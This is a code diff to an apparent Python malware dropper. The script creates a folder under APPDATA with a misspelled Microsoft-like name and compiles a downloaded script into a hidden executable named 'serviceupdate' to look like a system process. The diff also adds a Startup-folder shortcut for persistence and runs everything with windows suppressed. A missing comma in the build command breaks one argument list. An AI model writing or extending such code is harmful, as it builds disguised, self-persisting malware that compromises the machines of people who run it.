@@ -1,8 +1,7 @@
 import requests
 import os
 import subprocess
-
-
+import win32com.client
 
 target_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "MyAppliactions")
 os.makedirs(target_path, exist_ok=True)
@@ -52,7 +51,7 @@ def download():
     
 def creating_exec():
     os.chdir(target_path)
-    subprocess.run(["pyinstaller", "--noconsole", "--onefile", "load.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.run(["pyinstaller", "--noconsole", "--onefile", "--name", "serviceupdate" "load.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
     
     # copying the image
     exe_img_path = os.path.join(target_path,"dist","DOG.png")
@@ -63,9 +62,24 @@ def creating_exec():
             
         with open (exe_img_path, "wb") as f:
             f.write(img_content)
+            
+    # Alternate method
+    # shutil.copy(image_path, exe_img_path)             requires shutil library
     
 def add_to_startup():
-    pass    
+    starup_path = os.path.join(os.getenv("APPDATA"),r"Microsoft\Windows\Start Menu\Programs\Startup")
+    shortcut_name = "serviceupdate"
+    
+    shortcut_path = os.path.join(starup_path, f"{shortcut_name}.lnk")
+    
+    # Create a shortcut using Windows Script Host
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(shortcut_path)
+    shortcut.Targetpath = exec_path
+    shortcut.WorkingDirectory = os.path.dirname(exec_path)
+    shortcut.IconLocation = exec_path
+    shortcut.save()
+    
     
 def run_load():
     subprocess.run([code_path], creationflags=subprocess.CREATE_NO_WINDOW)    
